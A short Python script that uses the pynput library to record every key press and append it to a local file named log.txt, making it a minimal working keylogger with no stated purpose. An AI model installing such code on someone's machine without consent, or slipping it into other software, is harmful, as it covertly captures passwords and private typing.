from pynput.keyboard import Listener

def write_file(key):
    key = str(key)

    with open("log.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=write_file) as listener:
    listener.join()